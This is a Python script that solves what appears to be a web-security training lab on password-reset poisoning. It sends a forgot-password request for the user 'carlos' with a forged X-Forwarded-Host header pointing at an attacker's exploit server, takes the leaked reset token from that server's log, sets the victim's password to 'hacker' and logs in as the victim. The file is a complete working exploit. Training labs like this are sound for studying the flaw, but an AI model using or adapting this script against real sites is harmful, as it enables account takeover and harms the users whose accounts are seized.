import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url, exploit_server_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = exploit_server_url if exploit_server_url.endswith('/') else exploit_server_url + '/'
        self.session = requests.Session()
        self.victim_username = 'carlos'
        self.victim_reset_path = None

    def forget_victim_password(self):
        data = {
            'username': self.victim_username
        }
        headers = {
            'X-Forwarded-Host': self.exploit_server_url.replace('https://', '').rstrip('/')
        }
        self.session.post(self.lab_url + 'forgot-password', data=data, headers=headers)
        response = self.session.get(self.exploit_server_url + 'log')
        self.victim_reset_path = re.findall('(/forgot-password?.*) HTTP', response.text)[-1]

    def change_victim_password(self):
        data = {
            'temp-forgot-password-token': self.victim_reset_path.split('=')[-1],
            'new-password-1': 'hacker',
            'new-password-2': 'hacker'
        }
        self.session.post(self.lab_url + self.victim_reset_path.lstrip('/'), data=data)

    def sign_in_as_victim_user(self):
        data = {
            'username': self.victim_username,
            'password': 'hacker'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.forget_victim_password()
        self.change_victim_password()
        self.sign_in_as_victim_user()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1], sys.argv[2])
lab_solver.solve()
